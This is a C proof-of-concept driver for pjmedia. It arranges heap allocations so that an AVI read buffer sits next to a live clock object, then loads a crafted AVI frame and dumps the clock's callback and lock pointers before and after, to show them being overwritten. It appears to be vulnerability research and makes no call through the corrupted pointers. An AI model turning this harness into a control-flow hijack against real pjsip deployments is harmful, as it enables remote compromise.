/* W243: natural shipped-caller adjacency to a POINTER-BEARING live object.
 *
 * pjsip-apps/src/samples/vid_streamutil.c allocates play_file.read_buf from
 * the app pool (:733/:754) and then calls pjmedia_clock_create2() on that
 * same pool (:760).  clock_thread.c:174 allocates struct pjmedia_clock
 * (pool, cb, user_data, thread, lock pointers) from that pool, immediately
 * after read_buf.  This driver reproduces that allocation order with real
 * pjmedia APIs and pulls a crafted AVI frame into read_buf.  The local
 * struct mirrors clock_thread.c:110-132 only to READ the live object's
 * words after the write; nothing is called through the corrupted clock.
 *
 * argv[1] = AVI path.  No wire, no command, no pointer call.
 */
#include <pjlib.h>
#include <pjmedia.h>
#include <pjmedia/avi_stream.h>
#include <pjmedia/clock.h>
#include <pjmedia/format.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#define CHECK(call, label) do {                                            \
    pj_status_t _s = (call);                                               \
    if (_s != PJ_SUCCESS) {                                                \
        char _err[PJ_ERR_MSG_SIZE];                                        \
        pj_strerror(_s, _err, sizeof(_err));                               \
        fprintf(stderr, "FAIL %s: %s\n", label, _err);                     \
        _exit(2);                                                          \
    }                                                                      \
} while (0)

/* Mirror of pjmedia/src/pjmedia/clock_thread.c:110-132 for readback only. */
struct probe_clock {
    pj_pool_t               *pool;
    pj_timestamp             freq;
    pj_timestamp             interval;
    pj_timestamp             next_tick;
    pj_timestamp             timestamp;
    unsigned                 timestamp_inc;
    unsigned                 options;
    pjmedia_clock_callback  *cb;
    void                    *user_data;
    pj_thread_t             *thread;
    pj_bool_t                running;
    pj_bool_t                quitting;
    pj_lock_t               *lock;
    pj_mutex_t              *destroy_lock;
};

static void clock_cb(const pj_timestamp *ts, void *user_data)
{
    (void)ts;
    (void)user_data;
}

static void hexdump(const char *label, const unsigned char *p, size_t n)
{
    fprintf(stderr, "%s:", label);
    for (size_t i = 0; i < n; ++i)
        fprintf(stderr, "%02x", p[i]);
    fprintf(stderr, "\n");
}

int main(int argc, char **argv)
{
    pj_caching_pool cp;
    pj_pool_t *pool;
    pjmedia_avi_streams *streams = NULL;
    pjmedia_avi_stream *stream;
    pjmedia_port *port;
    const pjmedia_video_format_info *vfi;
    pjmedia_video_apply_fmt_param vafp;
    pjmedia_clock_param param;
    pjmedia_clock *clock = NULL;
    struct probe_clock *victim;
    pjmedia_frame frame;
    unsigned char *buf;
    size_t framebytes;
    char user_marker[] = "MISHE-CLOCK-USER";
    long delta;
    pj_status_t status;

    if (argc < 2) {
        fprintf(stderr, "usage: %s AVI\n", argv[0]);
        return 2;
    }
    CHECK(pj_init(), "pj_init");
    pj_caching_pool_init(&cp, NULL, 0);
    pool = pj_pool_create(&cp.factory, "app", 4000, 4000, NULL);
    if (!pool) {
        fprintf(stderr, "FAIL pool\n");
        return 2;
    }
    if (!pjmedia_video_format_mgr_instance())
        CHECK(pjmedia_video_format_mgr_create(pool, 64, 0, NULL), "vfmgr");
    fprintf(stderr, "AVI=%s\n", argv[1]);
    /* Shipped sample creates the AVI player before the app read buffer. */
    CHECK(pjmedia_avi_player_create_streams(pool, argv[1],
                                            PJMEDIA_AVI_FILE_NO_SYNC,
                                            &streams), "create_streams");
    stream = pjmedia_avi_streams_get_stream_by_media(streams, 0,
                                                     PJMEDIA_TYPE_VIDEO);
    if (!stream) {
        fprintf(stderr, "FAIL no video stream\n");
        return 2;
    }
    port = pjmedia_avi_stream_get_port(stream);
    vfi = pjmedia_get_video_format_info(NULL, port->info.fmt.id);
    if (!vfi) {
        fprintf(stderr, "FAIL no video format info\n");
        return 2;
    }
    pj_bzero(&vafp, sizeof(vafp));
    vafp.size = port->info.fmt.det.vid.size;
    CHECK(vfi->apply_fmt(vfi, &vafp), "apply_fmt");
    framebytes = vafp.framebytes;
    fprintf(stderr, "FORMAT id=%08x %ux%u bpp=%u framebytes=%zu\n",
            (unsigned)port->info.fmt.id,
            (unsigned)vafp.size.w, (unsigned)vafp.size.h,
            (unsigned)vfi->bpp, framebytes);

    /* vid_streamutil.c:733/754: read_buf from the app pool. */
    buf = (unsigned char *)pj_pool_alloc(pool, framebytes);
    if (!buf) {
        fprintf(stderr, "FAIL pool read_buf\n");
        return 2;
    }
    memset(buf, 0x41, framebytes);

    /* vid_streamutil.c:760: clock from the SAME pool, clock_thread.c:174. */
    pj_bzero(&param, sizeof(param));
    param.usec_interval = 40000;
    param.clock_rate = 1000;
    CHECK(pjmedia_clock_create2(pool, &param, PJMEDIA_CLOCK_NO_HIGHEST_PRIO,
                                clock_cb, user_marker, &clock), "clock");
    victim = (struct probe_clock *)clock;
    delta = (long)(((unsigned char *)victim) - buf);
    fprintf(stderr, "CLOCK_ALLOC delta=%ld size=%zu\n", delta,
            sizeof(*victim));
    fprintf(stderr, "CLOCK_BEFORE pool=%p cb=%p user=%p lock=%p\n",
            (void *)victim->pool, (void *)victim->cb,
            victim->user_data, (void *)victim->lock);
    hexdump("CLOCK_BYTES_BEFORE", (const unsigned char *)victim, 128);

    pj_bzero(&frame, sizeof(frame));
    frame.buf = buf;
    frame.size = framebytes;
    fprintf(stderr, "PULL_START frame.size=%zu\n", framebytes);
    fflush(stderr);
    status = pjmedia_port_get_frame(port, &frame);
    fprintf(stderr, "PULL_DONE status=%d frame.size=%u frame.type=%d\n",
            (int)status, (unsigned)frame.size, (int)frame.type);
    fprintf(stderr, "CLOCK_AFTER pool=%p cb=%p user=%p lock=%p\n",
            (void *)victim->pool, (void *)victim->cb,
            victim->user_data, (void *)victim->lock);
    hexdump("CLOCK_BYTES_AFTER", (const unsigned char *)victim, 128);
    /* Never destroy the corrupted pool or clock: no dereference, no call. */
    fflush(stdout);
    fflush(stderr);
    _exit(0);
}
